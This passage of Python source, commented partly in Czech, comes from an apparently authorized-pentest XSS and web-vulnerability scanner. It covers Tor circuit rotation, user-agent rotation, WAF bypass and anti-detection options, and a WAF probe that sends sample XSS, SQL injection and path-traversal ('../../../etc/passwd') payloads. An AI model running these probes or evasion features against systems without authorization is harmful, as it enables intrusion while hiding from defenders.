            if not force and elapsed < self.MIN_ROTATE_INTERVAL:
                logging.debug(
                    f"Tor rotation skipped (rate limit): last one {elapsed:.1f}s ago, "
                    f"minimum {self.MIN_ROTATE_INTERVAL}s"
                )
                return False

            success = False
            if self._stem_available and self._controller is not None:
                try:
                    from stem import Signal as _Signal
                    self._controller.signal(_Signal.NEWNYM)
                    success = True
                except Exception as e:
                    logging.warning(f"Tor NEWNYM via stem failed: {e}")
                    # Pokusíme se fallback socket
                    success = self._raw_socket_newnym()
            else:
                success = self._raw_socket_newnym()

            if success:
                self._last_rotate = now
                self._exit_ip = None  # invaliduj cache
                logging.info("Tor circuit rotated (NEWNYM)")
                # Počkej, ať se nový okruh ustanoví
                time.sleep(3)
            return success

    def _raw_socket_newnym(self) -> bool:
        """Fallback NEWNYM přes raw socket (no-auth Tor setup)."""
        try:
            import socket as _socket
            with _socket.create_connection(
                (self.host, self.control_port), timeout=3
            ) as s:
                s.sendall(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n')
                resp = s.recv(256).decode(errors="ignore")
                # Požadujeme 250 OK — pokud tam je "Authentication failed" tak fallback failed
                return "250 OK" in resp and "failed" not in resp.lower()
        except Exception as e:
            logging.debug(f"Raw socket NEWNYM selhal: {e}")
            return False

    # ── Lifecycle ─────────────────────────────────────────────────────

    def close(self):
        if self._controller is not None:
            try:
                self._controller.close()
            except Exception:
                pass
            self._controller = None

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

    @property
    def enabled(self) -> bool:
        return self._enabled


# Globální instance (singleton) — pro snadný přístup z různých funkcí
_GLOBAL_TOR_CONTROLLER: Optional[TorController] = None


def get_tor_controller() -> Optional[TorController]:
    """Vrátí globální Tor controller, pokud byl inicializován, jinak None."""
    return _GLOBAL_TOR_CONTROLLER


def init_tor_controller(control_port: int = 9051,
                         socks_port: int = 9050,
                         password: Optional[str] = None) -> Optional[TorController]:
    """Inicializuje globální TorController. Vrátí instanci nebo None při selhání."""
    global _GLOBAL_TOR_CONTROLLER
    tc = TorController(
        control_port=control_port,
        socks_port=socks_port,
        password=password,
    )
    if tc.detect():
        _GLOBAL_TOR_CONTROLLER = tc
        return tc
    return None


# ── Zpětně kompatibilní wrappers ────────────────────────────────────
# Stávající kód volá _is_tor_active() a _rotate_tor_circuit() přímo.
# Nechceme to všude refactorovat, takže tyto funkce teď delegují
# na TorController pokud je inicializovaný, jinak fallback socket.

def _is_tor_active() -> bool:
    """Kompat wrapper — použije TorController pokud existuje."""
    tc = get_tor_controller()
    if tc is not None and tc.enabled:
        return True
    # Fallback raw socket check
    import socket as _socket
    for port in (9050, 9051):
        try:
            with _socket.create_connection(("127.0.0.1", port), timeout=1):
                return True
        except Exception:
            continue
    return False


def _rotate_tor_circuit():
    """Kompat wrapper — použije TorController.rotate() s rate limitingem."""
    tc = get_tor_controller()
    if tc is not None:
        tc.rotate()
        return
    # Fallback raw socket (no-auth only)
    try:
        import socket as _socket
        with _socket.create_connection(("127.0.0.1", 9051), timeout=3) as s:
            s.sendall(b'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n')
            resp = s.recv(128).decode()
            if "250" in resp:
                logging.info("Tor circuit rotated (NEWNYM, raw fallback)")
    except Exception as e:
        logging.debug(f"Tor rotace selhala: {e}")


def _fetch_with_tor_retry(session, url, timeout, follow_redirects=True, max_attempts=3):
    """
    Fetch s Tor retry logic — vylepšeno:
      - UA rotace po každém pokusu (nový UA = nová session identity)
      - Tor rotate respektuje rate limit (skipne pokud < 10s)
      - Rozlišuje per-worker vs global rotation
    """
    # Responsive Stop: bail before ANY work — before the Tor-liveness probe too
    # (_is_tor_active() opens a socket and can block for a moment).
    _ce = getattr(session, "_cancel_event", None)
    if _ce is not None and _ce.is_set():
        return None

    tor_active = _is_tor_active()
    attempts = max_attempts if tor_active else 1

    for attempt in range(attempts):
        # bail before any (re)try — covers the Tor backoff-sleep window where
        # cancel fires while we're between attempts.
        if _ce is not None and _ce.is_set():
            return None
        try:
            # UA refresh — pokud má session attached rotator
            ua_rot = getattr(session, "_ua_rotator", None)
            if ua_rot is not None:
                session.headers.update(ua_rot.next_headers())
            r = session.get(url, timeout=timeout, allow_redirects=follow_redirects)
            # v10.16: vynutit načtení těla TADY (uvnitř try), aby případný
            # lazy-decode ValueError (mangled chunk/Content-Length) spadl do
            # našeho except, ne až u volajícího .text. requests obvykle čte
            # tělo eagerně, ale u některých chunked odpovědí se dekóduje líně.
            _ = r.content  # trigger decode; vyhodí ValueError pokud je tělo vadné
            return r
        except _NET_EXCEPTIONS as e:
            err_str = str(e)
            is_ssl_eof = "EOF" in err_str or "UNEXPECTED_EOF" in err_str
            is_timeout = "timeout" in err_str.lower() or "timed out" in err_str.lower()
            is_conn    = "Connection refused" in err_str or "NewConnectionError" in err_str

            if attempt < attempts - 1:
                logging.warning(f"[!]️  Pokus {attempt+1}/{attempts}: {err_str[:80]}")
                if tor_active and (is_ssl_eof or is_timeout):
                    logging.info("Rotuju Tor okruh...")
                    _rotate_tor_circuit()
                    time.sleep(3 + attempt * 2)
                    # Také vynutit UA rotaci
                    if ua_rot is not None:
                        ua_rot.force_rotate()
                elif is_conn and not tor_active:
                    logging.error(f"[ERR] Server unavailable: {err_str[:80]}")
                    return None
            else:
                logging.error(f"[ERR] Selhalo po {attempt+1} pokusech: {err_str[:100]}")
                return None
        except ValueError as e:
            # v10.16: WAF-mangled odpověď — urllib3 hodí
            # ValueError("invalid literal for int()") při parsování vadného
            # Content-Length / chunk-size (Cisco a podobné WAFy zmršené
            # chunked-transfer odpovědi). Není to RequestException → dřív
            # propadlo nahoru a shodilo celou fázi (POST/stored/CSP). ValueError
            # NEdědí z OSError, takže tahle větev je bezpečná a nezastíní
            # RequestException výš. Poškozenou odpověď nelze retryovat → skip.
            logging.debug(f"[FETCH] malformed response {url[:60]}: "
                          f"ValueError: {str(e)[:80]}")
            return None

    return None


# ══════════════════════════════════════════════════════════════════════════════
# ── HLAVNÍ SCAN FUNKCE ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def run_scan(target: str,
             payloads: List[str],
             workers: int,
             timeout: float,
             sleep_between: float,
             verify_ssl: bool,
             limit_urls: Optional[int],
             limit_payloads: Optional[int],
             early_exit: bool,
             canary: bool,
             marker_enabled: bool,
             marker_param: str,
             verbose: bool,
             report_path: Optional[Path],
             json_report: Optional[Path],
             rotate_ua: bool,
             user_agents: List[str],
             proxies: Dict[str, str],
             follow_redirects: bool,
             crawl_depth: int = 0,
             crawl_delay: float = 0.1,
             crawl_max_pages: int = 200,
             enable_fuzz: bool = False,
             fuzz_iters: int = 200,
             fuzz_budget_secs: int = 60,
             fuzz_batch: int = 16,
             fuzz_topn: int = 3,
             fuzz_ctx_probe: bool = True,
             dom_dynamic: bool = False,
             dom_budget_secs: int = 45,
             dom_wait: float = 2.0,
             enable_post_scan: bool = False,
             enable_json_scan: bool = False,
             enable_header_scan: bool = False,
             # v10.16: path-segment + cookie-reflected XSS (opt-in, pasivní GET
             # třída jako header scan). Default OFF — přidávají request volume.
             enable_path_scan: bool = False,
             enable_cookie_scan: bool = False,
             enable_context_scan: bool = True,
             enable_stored_scan: bool = False,
             stored_verify_urls: Optional[List[str]] = None,
             stored_wait_secs: float = 1.0,
             enable_blind_xss: bool = False,
             blind_oob_url: Optional[str] = None,
             # v10.47: korelovaná OOB blind XSS (self-hosted collector).
             blind_map_path: Optional[str] = None,   # kam zapsat injection mapu
             blind_poll_secs: float = 0.0,           # poll collectoru po spray
             blind_headers: bool = True,             # injektovat i do hlaviček
             enable_postmessage_scan: bool = False,
             enable_websocket_scan: bool = False,
             headless_verify: bool = False,    # v5: headless DOM verifier
             dom_v6_taint: bool = False,       # v6: taint-aware DOM XSS
             static_js: bool = False,          # v7: static JS AST analysis
             # v10.16: resume/checkpoint dlouhých skenů. checkpoint_path =
             # kam ukládat stav (None = vypnuto). resume = pokus se navázat
             # na existující checkpoint stejného skenu (jinak začni od nuly).
             checkpoint_path: Optional[str] = None,
             resume: bool = False,
             # v10.16: klient-ready HTML report (None = vypnuto)
             html_report: Optional[str] = None,
             sarif_report: Optional[str] = None,
             # v10.58: auto-PoC bundle (bug-bounty-ready) — None = vypnuto
             poc_report: Optional[str] = None,
             # v10.16: JSONP callback injection scan (high-value, opt-in)
             enable_jsonp_scan: bool = False,
             # v10.16: dangling markup + SVG/XML reflection (high-value, opt-in)
             enable_dangling_scan: bool = False,
             enable_svg_scan: bool = False,
             enable_graphql_scan: bool = False,  # v10.51: GraphQL reflected XSS
             enable_markdown_scan: bool = False,  # v10.59: Markdown/rich-text → XSS
             enable_css_scan: bool = False,       # v10.59: CSS injection / exfil
             enable_htmx_alpine_scan: bool = False,  # v10.69: htmx/Alpine attr XSS
             enable_dompurify_config_scan: bool = False,  # v10.70: DOMPurify config audit
             enable_cache_poisoning_scan: bool = False,  # v10.71: cache poisoning → stored XSS
             enable_sourcemap: bool = False,   # v10.51: source-map de-minification (augments static-js)
             trusted_types: bool = False,      # v8: TT policy + CSP audit
             stored_roundtrip: bool = False,   # v9: multi-canary stored XSS hunt
             proto_pollution: bool = False,    # v10: prototype pollution → XSS
             dom_clobbering: bool = False,     # v10.4: DOM Clobbering → XSS chain
             ssr_hydration: bool = False,      # v10.5: SSR Hydration XSS (CVE-2026-27902)
             csp_bypass: bool = False,         # v10.6: CSP Bypass Detection Layer
             adaptive_waf: bool = False,       # v10.7: WAF Adaptive Obfuscation Pipeline
             open_redirect: bool = False,      # v10.11: Open Redirect → XSS chain
             param_wordlist: bool = False,     # v10.14: hidden GET param discovery (wordlist fuzzing)
             auth_cookies: str = "",           # v10.15: cookie injection for authenticated scanning
             callbacks: Optional[Dict[str, Callable]] = None,
             # Tor options (voláno z main() pokud args.tor)
             tor_rotate_every: int = 0,
             tor_isolate_workers: bool = False,
             ua_rotate_every: int = 5,
             # Anti-detection options (#6, #7)
             cffi_impersonate: Optional[str] = None,
             legacy_tls: bool = False,
             scan_intensity: Optional[str] = None,
             # v10.14: warm-up sequence — realistická origin probe
             # (robots.txt, favicon.ico, homepage) před prvním útokem.
             # Default True — uživatel může vypnout pro rychlejší scan.
             warmup_origin: bool = True,
             # v10.14: CORS misconfiguration scan — non-destructive,
             # detekuje ACAO reflection / null origin / bypasses.
             # Default True.
             cors_scan_enabled: bool = True,
             # v10.14: CRLF injection scan — non-destructive,
             # detekuje header injection přes URL params (%0d%0a).
             # Default True.
             crlf_scan_enabled: bool = True,
             # v10.14: XSSI scan — non-destructive, detekuje JSONP
             # callback reflection a JS-parseable JSON arrays.
             # Default True.
             xssi_scan_enabled: bool = True,
             # SSRF scan — detekuje Server-Side Request Forgery na URL
             # parametrech. v10.15: DEFAULT OFF (dříve True). SSRF je
             # aktivní vektor — nutí cílový server dělat requesty na
             # cloud metadata (169.254.169.254), interní porty (redis,
             # SSH) atd. To může spustit IDS/cloud alarmy a u sdíleného
             # hostingu / přísně vymezeného rozsahu povolení překročit
             # scope autorizace. Proto opt-in, stejně jako destructive:
             # CLI --ssrf-scan, v GUI checkbox s autorizačním dialogem.
             ssrf_scan_enabled: bool = False,
             # v10.14: DESTRUCTIVE TESTING — opt-in jen s explicitním
             # potvrzením autorizace v GUI dialogu. Aktivuje Cache
             # Poisoning, Host Header password reset, Stored XSS via
             # headers. Default False.
             destructive_enabled: bool = False,
             # Email pro Host Header password reset test (musí být pod
             # kontrolou pentestera). Pokud None, host header reset se
             # neprovádí.
             destructive_test_email: Optional[str] = None,
             # v10.23: Evidence/finding persistence pro ML/drift/triage.
             # Když je zadána cesta, KAŽDÝ nález (info→critical) ze všech fází
             # se uloží do JSONL storu s plnou raw evidencí, stabilním
             # fingerprintem, verzováním a origin/retention flagem. Default
             # None = vypnuto (žádná změna chování). FP se ladí AŽ POTÉ —
             # tady jen zachytáváme vše.
             evidence_store_path: Optional[str] = None,
             evidence_origin: str = "public",          # public|consented|client
             evidence_retention_days: Optional[int] = None,
             gui_mode: bool = False,
             cancel_event=None,
             # v10.46: authenticated headless-driven crawl (real-DOM, SPA, auth).
             # Default OFF → chování beze změny. Když True a Playwright je k
             # dispozici, proběhne před skenem a sloučí pages/param_urls/forms/API.
             headless_crawl: bool = False,
             headless_crawl_opts: Optional[Dict] = None,  # {max_depth,max_pages,clicks,…}
             crawl_auth: Optional[Dict] = None,  # {storage_state|login_url,username,
                                                 #  password,*_selector,logged_in_*,
                                                 #  extra_headers}
             ) -> List[Tuple[str, str]]:

    cb = callbacks or make_callbacks()
    _cancelled = cancel_event or __import__("threading").Event()
    # V GUI módu alive_bar způsobuje nested chybu — nahradit no-op
    _bar = _noop_bar if gui_mode else alive_bar

    # ── v10.16: Checkpoint / resume init ──────────────────────────────────────
    # Fingerprint skenu (target + scan-defining config) zajistí, že se
    # resume naváže JEN na stejný sken. Při --resume se načte uložený stav;
    # dokončené fáze se přeskočí, jejich výstupy obnoví.
    _ckpt = None
    _resumed_findings: List[dict] = []
    if _CHECKPOINT_AVAILABLE and checkpoint_path:
        try:
            # IMPORTANT: include EVERY scan-defining key make_fingerprint knows
            # about. If a key is omitted here it silently drops out of the
            # fingerprint, so changing it does NOT invalidate the checkpoint and
            # a --resume reuses stale phase output. That was the bug where raising
            # crawl_max_pages (e.g. 200 → 400) still resumed the old 200-page
            # crawl instead of crawling out to the new limit. Keys must match
            # _checkpoint.make_fingerprint's `defining_keys` names exactly.
            _ck_cfg = {
                "payloads": payloads, "limit_urls": limit_urls,
                "limit_payloads": limit_payloads, "early_exit": early_exit,
                "marker_enabled": marker_enabled, "marker_param": marker_param,
                "follow_redirects": follow_redirects, "crawl_depth": crawl_depth,
                "crawl_max_pages": crawl_max_pages,
                "enable_post_scan": enable_post_scan,
                "enable_json_scan": enable_json_scan,
                "enable_header_scan": enable_header_scan,
                "enable_context_scan": enable_context_scan,
                "enable_stored_scan": enable_stored_scan,
                "enable_path_scan": enable_path_scan,
                "enable_cookie_scan": enable_cookie_scan,
                "ssrf_scan_enabled": ssrf_scan_enabled,
                "cors_scan_enabled": cors_scan_enabled,
                "xssi_scan_enabled": xssi_scan_enabled,
                "crlf_scan_enabled": crlf_scan_enabled,
                "destructive_enabled": destructive_enabled,
                "static_js": static_js,
                "param_wordlist": param_wordlist,
            }
            _fp = _ckpt_fingerprint(target, _ck_cfg)
            _ckpt = _CheckpointManager(checkpoint_path, _fp, enabled=True)
            if resume:
                _st = _ckpt.load()
                if _st is not None:
                    _resumed_findings = _ckpt.get_findings()
                    _done = _ckpt.get_phase_output  # noqa: just to show usage
                    cb["on_log"](
                        f"[RESUME] Resuming from checkpoint: completed phases="
                        f"{_st.get('phases_done', [])}, "
                        f"restored {len(_resumed_findings)} findings", "info")
                    # v10.77: DON'T emit here — reset_emit_state() below wipes the
                    # emit state, and a bare cb['on_hit'] bypasses _emitted_hits
                    # (so the report + CI gate never saw restored findings). The
                    # restore is deferred to _reseed_resumed_findings() AFTER reset.
                else:
                    cb["on_log"](
                        "[RESUME] No compatible checkpoint for this "
                        "scan — starting from scratch.", "info")
        except Exception as _cke:
            cb["on_log"](f"[RESUME] checkpoint init failed: {_cke}", "warning")
            _ckpt = None

    # ── v10.7: Set adaptive WAF state at scan start ──
    # Module-level toggle is read by context-aware fuzzer to switch from
    # generic waf_bypass_chain() to WAF-aware _waf_generate_obfuscation_chain().
    global _ADAPTIVE_WAF_ENABLED, _ADAPTIVE_WAF_TARGET_HOST
    _ADAPTIVE_WAF_ENABLED = bool(adaptive_waf)
    _ADAPTIVE_WAF_TARGET_HOST = None  # set after target is normalized below

    # ── Auto-doplnění schématu ────────────────────────────────────────────────
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
        cb["on_log"](f"Scheme was missing, using: {target}", "info")

    session_main = make_session(verify_ssl=verify_ssl, rotate_ua=rotate_ua,
                                 user_agents=user_agents, proxies=proxies,
                                 cffi_impersonate=cffi_impersonate,
                                 legacy_tls=legacy_tls)
    session_main._tor_rotate_every = tor_rotate_every  # type: ignore[attr-defined]
    session_main._scan_intensity = scan_intensity  # type: ignore[attr-defined]
    _bind_cancel_to_session(session_main, _cancelled)  # responsive Stop

    # v10.14: Warm-up sequence — realistický browser-like přístup
    # k cíli (robots.txt → favicon.ico → homepage) předtím než scanner
    # začne ostrý útok. Pre-establishuje session cookies, vytvoří
    # browser-like fingerprint pattern v server logu. Best-effort,
    # chyby ignorovány — scan pokračuje i při total fail.
    if warmup_origin:
        try:
            _perform_warmup_sequence(
                session_main,
                target,
                timeout=min(timeout, 4.0),
                on_log=cb.get("on_log"),
            )
        except Exception as _we:
            # Defensive — warm-up nesmí nikdy zabít scan
            try:
                cb["on_log"](f"[warm-up] sequence failed silently: {_we}",
                              "debug")
            except Exception:
                pass

    # ── Authenticated scanning (v10.15) ──────────────────────────────────────
    # Inject cookies BEFORE the DNS fallback / target fetch, so even the
    # very first request runs authenticated. The validation probe below
    # the target fetch tells us whether the auth actually took effect.
    _auth_cookie_dict: Dict[str, str] = {}
    if auth_cookies and _AUTH_AVAILABLE:
        try:
            _auth_cookie_dict = _auth_parse_cookies(auth_cookies)
        except Exception as _ae:
            cb["on_log"](f"[!] Failed to parse auth_cookies: {_ae}", "error")
        if _auth_cookie_dict:
            # Scope cookies to the target host so they don't leak to redirects
            _parsed_for_auth = urlparse(target if "://" in target
                                          else "https://" + target)
            _auth_host = _parsed_for_auth.hostname or None
            n_injected = _auth_inject(session_main, _auth_cookie_dict,
                                       domain=_auth_host)
            cb["on_log"](
                f"[OK] {_auth_status(_auth_cookie_dict)} "
                f"(injected for {_auth_host or '<no host>'})", "info")
        else:
            cb["on_log"](
                "[!] auth_cookies provided but parsed empty — "
                "running anonymously. Format expected: "
                "'name1=val1; name2=val2'", "info")
    elif auth_cookies and not _AUTH_AVAILABLE:
        cb["on_log"](
            "[!] auth_cookies requested but _auth.py module not "
            "available — running anonymously", "info")

    # ── DNS fallback ─────────────────────────────────────────────────────────
    parsed = urlparse(target)
    host   = parsed.hostname or ""
    if host:
        if not try_resolve(host):
            alt = host[4:] if host.startswith("www.") else "www." + host
            if try_resolve(alt):
                new_netloc = parsed.netloc.replace(host, alt)
                target     = urlunparse(parsed._replace(netloc=new_netloc))
                cb["on_log"](f"DNS fallback: used {alt} instead of {host}", "info")
            else:
                cb["on_log"](f"Cannot resolve hostname {host} or {alt}. Aborting.", "error")
                return []

    # v10.7: store target host for adaptive obfuscation lookup
    _ADAPTIVE_WAF_TARGET_HOST = urlparse(target).hostname or ""
    if _ADAPTIVE_WAF_ENABLED:
        cb["on_log"](
            f"[ADAPTIVE-WAF] enabled — will use WAF-specific bypass templates "
            f"when WAF is detected on {_ADAPTIVE_WAF_TARGET_HOST}", "info"
        )

    # v10.9: Headless verifier diagnostic — warn user if modern detection
    # modules are enabled WITHOUT runtime verification. Without headless,
    # findings are "suspected" not "confirmed" and FP rates are higher.
    modern_detection_active = any([
        proto_pollution, dom_clobbering, ssr_hydration, csp_bypass,
        trusted_types, dom_v6_taint, static_js
    ])
    if modern_detection_active and not headless_verify:
        cb["on_log"](
            "[!] Modern detection modules enabled without --headless-verify "
            "— findings will be 'suspected', not runtime-confirmed. "
            "Consider enabling Headless verification for high-confidence reports.",
            "warn"
        )

    # ── HTTP → HTTPS fallback ─────────────────────────────────────────────────
    r = None
    if target.startswith("http://"):
        r = _fetch_with_tor_retry(session_main, target, timeout, follow_redirects=True, max_attempts=2)
        if r is not None and r.url.startswith("https://"):
            target = r.url
        elif r is None or not r.ok:
            https_target = target.replace("http://", "https://", 1)
            r = _fetch_with_tor_retry(session_main, https_target, timeout, follow_redirects=True, max_attempts=3)
            if r is None:
                cb["on_log"](f"Cannot establish a connection to {https_target}.", "error"); return []
            target = https_target
    else:
        r = _fetch_with_tor_retry(session_main, target, timeout, follow_redirects=True, max_attempts=3)
        if r is None:
            cb["on_log"](f"Cannot establish a connection to {target}.", "error"); return []

    html = r.text or ""
    cb["on_log"](f"[OK] Target loaded: {target} (status {r.status_code}, {len(html)} bytes)", "info")

    # ── Auth validation (v10.15) ─────────────────────────────────────────────
    # If the user supplied cookies, sanity-check that we're actually logged
    # in. We use the response we already have (no extra request) — pass it
    # through looks_like_login_page() to detect "redirected to /login" or
    # "page shows a login form" patterns.
    if _auth_cookie_dict and _AUTH_AVAILABLE:
        try:
            from _auth import looks_like_login_page
            _is_login, _reason = looks_like_login_page(
                html, r.status_code, r.url)
            if _is_login:
                cb["on_log"](
                    f"[!] Auth validation FAILED: target looks like a login "
                    f"page ({_reason}). Cookies may be expired or for the "
                    f"wrong host. Scan continues but may miss authenticated "
                    f"surface area.", "error")
            else:
                cb["on_log"](
                    f"[OK] Auth validation passed — session active "
                    f"(HTTP {r.status_code}, final URL {r.url})", "info")
        except Exception as _ave:
            cb["on_log"](f"[!] Auth validation skipped: {_ave}", "info")

    # ── Context Engine status ────────────────────────────────────────────────
    # Viditelné ohlášení stavu parser-based context detection.
    if _CONTEXT_ENGINE_AVAILABLE:
        # Self-check: ověř že engine opravdu funguje (ne jen import OK)
        try:
            _ce_selftest = _ce_analyze(
                '<script>var x = "SELFTESTMARKER";</script>',
                "SELFTESTMARKER", '";alert(1)//')
            if (_ce_selftest is not None
                and _ce_selftest.context is not None
                and _ce_selftest.context == _CtxFamily.JS):
                cb["on_log"](
                    "[CONTEXT] parser-based detection ACTIVE "
                    "(tree-sitter-html + esprima + bs4)",
                    "info"
                )
            else:
                cb["on_log"](
                    "[CONTEXT] engine imported but self-test failed "
                    "— using the legacy regex classifier",
                    "warning"
                )
        except Exception as _ce_st_err:
            cb["on_log"](
                f"[CONTEXT] self-test raised {type(_ce_st_err).__name__}: {_ce_st_err} "
                f"— using the legacy regex classifier",
                "warning"
            )
    else:
        cb["on_log"](
            "[CONTEXT] parser-based engine UNAVAILABLE — using the legacy regex classifier. "
            "For accurate detection: pip install esprima tree-sitter "
            "tree-sitter-javascript tree-sitter-html",
            "warning"
        )

    # ── Early WAF detection ──────────────────────────────────────────────────
    # Detekuje Cloudflare/Akamai/Imperva/... z hlaviček úvodní response.
    # Mnoho WAFů se projeví už v cf-ray / server / cookies i na čistém GET.
    # Do run_scan lokálního stavu (waf_seen, waf_by_host) se tyto nálezy
    # propíší později ve fázi test_payload — tady jen informujeme GUI.
    _early_reported_host = None
    _early_waf = fingerprint_waf(r)
    if _early_waf:
        _early_host = urlparse(target).hostname or target
        # v10.7: remember detection for adaptive obfuscation
        _waf_remember_detection(_early_host, _early_waf["name"])
        cb["on_waf"]({
            "name":       _early_waf["name"],
            "host":       _early_host,
            "confidence": _early_waf["confidence"],
            "reason":     _early_waf.get("reason", "") + " (pre-scan)",
        })
        _early_reported_host = _early_host
        cb["on_log"](
            f"[WAF] pre-scan detekce: {_early_waf['name']} "
            f"na {_early_host} (confidence: {_early_waf['confidence']}%)",
            "info"
        )

    # ── Active WAF probe ─────────────────────────────────────────────────────
    # Pasivní fingerprinting (jen headers) propásne WAFy, které se aktivují
    # až při útočném requestu (ModSecurity, AWS WAF se signaturami, Incapsula
    # s behavioral rules). Pošleme 2-3 úmyslně podezřelé probe requesty a
    # analyzujeme reakce (403/406/429, Challenge page, Body s WAF signaturou).
    try:
        _probe_payloads = [
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "../../../etc/passwd",
        ]
        _active_detected = False
        _probe_host = urlparse(target).hostname or target
        for _pp in _probe_payloads:
            if _cancelled.is_set():
                break
            _probe_url = target + ("&" if "?" in target else "?") + f"_xg={_pp}"
            _pr = perform_request(
                session_main, _probe_url, timeout,
                follow_redirects=False,
            )
            if _pr is None or _pr is _REQUEST_FAILED:
                continue
            # Explicitní bloky podle status kódu
            if _pr.status_code in (403, 406, 429, 501, 502):
                _pfp = fingerprint_waf(_pr) or {
                    "name": f"WAF/IPS (status {_pr.status_code} na probe payload)",
                    "confidence": 55,
                    "reason": f"blok status={_pr.status_code} na probe '{_pp[:20]}'",
                }
                # Report jen pokud ještě nebyl raportován pro stejný host
                if _probe_host != _early_reported_host:
                    cb["on_waf"]({
                        "name":       _pfp["name"],
                        "host":       _probe_host,
                        "confidence": _pfp["confidence"],
                        "reason":     _pfp.get("reason", "") + " (active-probe)",
                    })
                    _early_reported_host = _probe_host
                cb["on_log"](
                    f"[WAF] active probe: server responded {_pr.status_code} "
                    f"to a malicious payload ({_pfp['name']})",
                    "info"
                )
                _active_detected = True
                break
            # Body-based WAF fingerprint (challenge page, blocked by...)
            _pfp2 = fingerprint_waf(_pr)
            if _pfp2 and _probe_host != _early_reported_host:
                cb["on_waf"]({
                    "name":       _pfp2["name"],
                    "host":       _probe_host,
                    "confidence": _pfp2["confidence"],
                    "reason":     _pfp2.get("reason", "") + " (active-probe)",
                })
                _early_reported_host = _probe_host
                cb["on_log"](
                    f"[WAF] active probe: {_pfp2['name']} "
                    f"identified in response body",
                    "info"
                )
                _active_detected = True
                break

        if not _active_detected and not _early_waf:
            cb["on_log"]("[WAF] probe: no WAF detected (target responds normally)", "info")
    except Exception as _we:
        cb["on_log"](f"[!] WAF probe error (non-fatal): {_we}", "debug")

    # ── CSP analýza ──────────────────────────────────────────────────────────
    csp_result = analyze_csp(r)
    cb["on_csp"](csp_result)

    # ── DOM statická analýza ──────────────────────────────────────────────────
    dom_stat = static_dom_xss_scan(session_main, html, target, timeout)
    if dom_stat:
        cb["on_log"](f"DOM-XSS static analysis: found {len(dom_stat)} sources.", "info")

    # ── v10.14: CORS misconfiguration scan ───────────────────────────────────
    # Non-destructive — jen GET requesty s custom Origin headerem. Detekuje
    # ACAO reflection, null origin acceptance, suffix/prefix bypass.
    # Opt-out přes cors_scan_enabled=False (default True).
    cors_findings: List[Dict] = []
    # ── v10.15: DESTRUCTIVE testy PŘESUNUTY za crawl ────────────────────────
    # Dřív běžely TADY (před crawlem) jen proti seed target. Nově běží až
    # po dokončení crawleru, spolu s ostatními web-vuln scany (viz níže).

    # ── Crawling ──────────────────────────────────────────────────────────────
    param_urls: List[str] = []
    pages: List[str] = []  # crawled pages — používá se i v pozdějších fázích (stored XSS verify)
    # v10.52: HTML of the first crawled pages, captured during the crawl so the
    # downstream page-analysis phases reuse it instead of re-downloading. Bound
    # covers the largest subset any phase iterates (pages[:50]).
    _crawl_html_cache: Dict[str, str] = {}
    _CRAWL_HTML_CACHE_LIMIT = 64
    # v10.16: pokud je crawl už v checkpointu, obnov jeho výstup a přeskoč.
    _crawl_from_ckpt = False
    if _ckpt is not None and _ckpt.is_phase_done("crawl"):
        _co = _ckpt.get_phase_output("crawl", {}) or {}
        pages = list(_co.get("pages", []))
        param_urls = list(_co.get("param_urls", []))
        _crawl_from_ckpt = True
        cb["on_log"](
            f"[RESUME] Crawl skipped — restored {len(pages)} pages, "
            f"{len(param_urls)} param URLs from checkpoint.", "info")
    if (not _crawl_from_ckpt) and crawl_depth and crawl_depth > 0:
        cb["on_phase"]("crawl", {"target": target, "depth": crawl_depth, "max_pages": crawl_max_pages})

        # ── Pasivní WAF detekce (v10.14) ─────────────────────────────────
        # WAF se prozradí v NORMÁLNÍM provozu — cf-ray, x-iinfo,
        # x-akamai-*, ak_bmsc cookie, server string, challenge stránka.
        # Crawler stejně stahuje desítky stránek; necháme každou odpověď
        # projít signature fingerprintem. Žádné requesty navíc, žádné
        # útočné payloady, vrací konkrétní NÁZEV WAF. První spolehlivá
        # shoda se zapamatuje a oznámí — detekce proběhne VČAS, během
        # crawleru, ne až v útočné fázi.
        # v10.52: closure je teď definovaný PŘED crawlem a předaný jako
        # on_response — WAF check běží INLINE během crawlu (ne v re-fetchi).
        _passive_waf_found = False
        _passive_waf_host = urlparse(target).hostname or target

        def _passive_waf_check(resp):
            nonlocal _passive_waf_found
            if _passive_waf_found or resp is None:
                return
            try:
                wf = fingerprint_waf(resp)
            except Exception:
                return
            # Bereme jen spolehlivé signaturové shody (≥60) — pasivní
            # detekce nesmí dělat false-positive z náhodného 403.
            if wf and wf.get("confidence", 0) >= 60:
                _passive_waf_found = True
                _name = wf.get("name", "Unknown WAF")
                _conf = wf.get("confidence", 0)
                if "CDN only" not in _name:
                    _waf_remember_detection(_passive_waf_host, _name)
                cb["on_waf"]({
                    "name":       _name,
                    "host":       _passive_waf_host,
                    "confidence": _conf,
                    "reason":     wf.get("reason", "")
                                  + " (passive, from crawl traffic)",
                })
                cb["on_log"](
                    f"[WAF] Detected from traffic: {_name} "
                    f"(confidence: {_conf}%) — {wf.get('reason','')[:80]}",
                    "info"
                )

        # v10.52 PERF: collect parameter URLs + run the passive WAF check INLINE
        # during the crawl (the crawler already downloads every page). Previously
        # a separate phase RE-FETCHED all N crawled pages serially just to run
        # find_param_urls()/WAF on them — on a 370-page target that was ~20 min of
        # pure duplicate downloads. Now it's free: same find_param_urls() on the
        # same HTML, same WAF fingerprint on the same responses (incl. 4xx), zero
        # extra requests. Nothing is lost — only the redundant second pass.
        _crawl_param_sink: set = set()
        # v10.52: crawl concurrency follows the user's Threads setting (was a
        # hardcoded cap of 5). The thread slider is the politeness control —
        # WAF/Recon presets (4 threads) stay slow, Fast/Bounty (40/15) crawl
        # faster. Capped at 16 so the FIRST contact with the target isn't
        # extreme; crawl_delay still spaces the batches.
        _crawl_workers = max(1, min(workers, 16))
        pages = crawl_site(target, session_main, max_depth=crawl_depth, delay=crawl_delay, max_pages=crawl_max_pages, callbacks=cb, cancel_event=_cancelled, workers=_crawl_workers, timeout=timeout, param_url_sink=_crawl_param_sink, on_response=_passive_waf_check, page_html_sink=_crawl_html_cache, html_cache_limit=_CRAWL_HTML_CACHE_LIMIT)

        # Drain the inline-collected param URLs (dedup against anything already
        # present, e.g. from a partial checkpoint).
        seen_urls: set = set(param_urls)
        for u in _crawl_param_sink:
            if u not in seen_urls:
